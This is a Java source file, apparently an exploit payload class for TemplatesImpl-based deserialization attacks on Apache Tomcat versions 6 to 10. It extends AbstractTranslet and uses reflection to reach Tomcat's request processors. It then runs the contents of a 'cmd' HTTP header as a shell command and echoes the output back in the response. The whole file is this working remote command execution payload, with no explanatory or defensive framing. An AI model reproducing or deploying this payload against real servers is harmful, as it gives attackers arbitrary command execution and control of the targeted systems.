package test;
import java.lang.reflect.Field;
import java.util.ArrayList;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class TemplatesImplTomcat678910cmdecho extends AbstractTranslet {
    public TemplatesImplTomcat678910cmdecho() throws Exception {
    	boolean flag = false;
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "global");
    	        ArrayList processors = (ArrayList) getFieldValue(obj, "processors");
    	        for(Object processor : processors) {
    	            Object req = getFieldValue(processor, "req");
    	            Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
    	            str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
    	            if (str != null && !str.isEmpty()) {
    	                resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
    	                String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
    	                byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
    	                try {
    	                    Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
    	                    obj = cls.newInstance();
    	                    cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
    	                    resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
    	                } catch (NoSuchMethodException var5) {
    	                    Class cls = Class.forName("java.nio.ByteBuffer");
    	                    obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
    	                    resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
    	                }
    	                flag = true;
    	            }
    	            if (flag) break;
    	        }
    	        if (flag)  break;
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
    	Field field;
    	try {
    		field = obj.getClass().getDeclaredField(fieldName);
		} catch (Exception e) {
			try {
				field = obj.getClass().getSuperclass().getDeclaredField(fieldName);
			} catch (Exception e2) {
				field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(fieldName);
			}
		}
        field.setAccessible(true);
        return field.get(obj);
    }
}
